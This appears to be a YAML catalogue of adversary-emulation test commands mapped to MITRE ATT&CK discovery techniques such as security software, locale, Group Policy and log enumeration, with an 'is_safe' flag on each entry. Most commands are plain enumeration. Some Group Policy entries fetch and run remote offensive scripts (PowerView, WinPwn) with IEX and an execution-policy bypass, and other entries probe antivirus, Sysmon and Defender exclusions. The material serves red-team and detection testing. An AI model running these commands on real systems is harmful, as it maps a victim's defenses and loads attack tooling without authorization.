    - name: Security Software Discovery - ps (Linux)
      type: sh
      platform: linux
      command: ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'
      timeout: 60
    - name: Security Software Discovery - pgrep (FreeBSD)
      type: sh
      platform: linux
      command: pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
      timeout: 60
    - name: Security Software Discovery - Sysmon Service
      type: cmd
      platform: windows
      command: fltmc.exe | findstr.exe 385201
      timeout: 120
      elevation_required: true
    - name: Security Software Discovery - AV Discovery via WMI
      type: cmd
      platform: windows
      command: wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
      timeout: 120
      elevation_required: true
    - name: Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets
      type: cmd
      platform: windows
      command: |-
        powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct
        powershell Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct
      timeout: 120
      elevation_required: true
    - name: Security Software Discovery - Windows Defender Enumeration
      type: powershell
      platform: windows
      command: |-
        Get-Service WinDefend #check the service state of Windows Defender
        Get-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc
        Get-MpThreat #threats details that have been detected using MS Defender
      timeout: 120
      elevation_required: true
    - name: Security Software Discovery - Windows Firewall Enumeration
      type: powershell
      platform: windows
      command: |-
        Get-NetFirewallProfile | Format-Table Name, Enabled
        Get-NetFirewallSetting
        Get-NetFirewallRule | select DisplayName, Enabled, Description
      timeout: 120
      elevation_required: true
    - name: Get Windows Defender exclusion settings using WMIC
      type: cmd
      platform: windows
      command: wmic /Node:localhost /Namespace:\\root\Microsoft\Windows\Defender Path MSFT_MpPreference Get /format:list | findstr /i /C:"DisableRealtimeMonitoring" /C:"ExclusionPath" /C:"ExclusionExtension" /C:"ExclusionProcess"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1518/001
  is_safe: false
- id: T1614
  name: System Location Discovery
  description: |-
    Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

    Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, an...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Get geolocation info through IP-Lookup services using curl Windows
      type: cmd
      platform: windows
      command: C:\Windows\System32\Curl.exe -k https://ipinfo.io/
      timeout: 120
    - name: Get geolocation info through IP-Lookup services using curl freebsd, linux or macos
      type: bash
      platform: macos
      command: curl -k https://ipinfo.io/
      timeout: 60
    - name: Get geolocation info through IP-Lookup services using curl freebsd, linux or macos
      type: bash
      platform: linux
      command: curl -k https://ipinfo.io/
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1614
  is_safe: true
- id: T1614.001
  name: System Language Discovery
  description: 'Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware...'
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Discover System Language by Registry Query
      type: cmd
      platform: windows
      command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language
      timeout: 120
    - name: Discover System Language with chcp
      type: cmd
      platform: windows
      command: chcp
      timeout: 120
    - name: Discover System Language with locale
      type: sh
      platform: linux
      command: locale
      timeout: 60
    - name: Discover System Language with localectl
      type: sh
      platform: linux
      command: localectl status
      timeout: 60
    - name: Discover System Language by locale file
      type: sh
      platform: linux
      command: '[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale'
      timeout: 60
    - name: Discover System Language by Environment Variable Query
      type: sh
      platform: linux
      command: |-
        env | grep LANG
        printenv LANG
        set | grep LANG
      timeout: 60
    - name: Discover System Language with dism.exe
      type: cmd
      platform: windows
      command: dism.exe /online /Get-Intl
      timeout: 120
      elevation_required: true
    - name: Discover System Language by Windows API Query
      type: cmd
      platform: windows
      command: PathToAtomicsFolder\..\ExternalPayloads\LanguageKeyboardLayout.exe
      timeout: 120
    - name: Discover System Language with WMIC
      type: cmd
      platform: windows
      command: wmic /node:localhost os get Locale,OSLanguage,MUILanguages /format:table
      timeout: 120
    - name: Discover System Language with Powershell
      type: powershell
      platform: windows
      command: |-
        $info = @{
          UILanguage     = Get-WinUILanguageOverride
          UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '
          SystemLocale   = Get-WinSystemLocale
          CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name
          CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name
          TimeZone       = (Get-TimeZone).Id
        }
        $info.GetEnumerator() | ForEach-Object { "$($_.Name): $($_.Value)" }
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1614/001
  is_safe: false
- id: T1615
  name: Group Policy Discovery
  description: Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<...
  tactic: discovery
  platforms:
    - windows
  executors:
    - name: Display group policy information via gpresult
      type: cmd
      platform: windows
      command: gpresult /z
      timeout: 120
    - name: Get-DomainGPO to display group policy information via PowerView
      type: powershell
      platform: windows
      command: powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
      timeout: 120
      elevation_required: true
    - name: WinPwn - GPOAudit
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        GPOAudit -noninteractive -consoleoutput
      timeout: 120
    - name: WinPwn - GPORemoteAccessPolicy
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        GPORemoteAccessPolicy -consoleoutput -noninteractive
      timeout: 120
    - name: MSFT Get-GPO Cmdlet
      type: powershell
      platform: windows
      command: Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\GPO_Output.txt
      cleanup: del $env:temp\GPO_Output.txt -erroraction silentlycontinue
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1615
  is_safe: false
- id: T1652
  name: Device Driver Discovery
  description: Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Pr...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Device Driver Discovery
      type: powershell
      platform: windows
      command: |-
        driverquery /v /fo list
        driverquery /si /fo list
      timeout: 120
    - name: Device Driver Discovery (Linux)
      type: bash
      platform: linux
      command: lsmod
      timeout: 60
    - name: Enumerate Kernel Driver Files (Linux)
      type: bash
      platform: linux
      command: find /lib/modules/$(uname -r)/kernel/drivers -name "*.ko*"
      timeout: 60
    - name: List loaded kernel extensions (macOS)
      type: bash
      platform: macos
      command: kextstat
      timeout: 60
    - name: Find Kernel Extensions (macOS)
      type: bash
      platform: macos
      command: kextfind
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1652
  is_safe: true
- id: T1654
  name: Log Enumeration
  description: |-
    Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).

    Host binaries may be leveraged to colle...
  tactic: discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Get-EventLog To Enumerate Windows Security Log
      type: powershell
      platform: windows
      command: powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\T1654_events.txt}
      cleanup: powershell -c "remove-item $env:temp\T1654_events.txt -ErrorAction Ignore"
      timeout: 120
      elevation_required: true
    - name: Enumerate Windows Security Log via WevtUtil
      type: cmd
      platform: windows
      command: wevtutil enum-logs
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1654
  is_safe: false
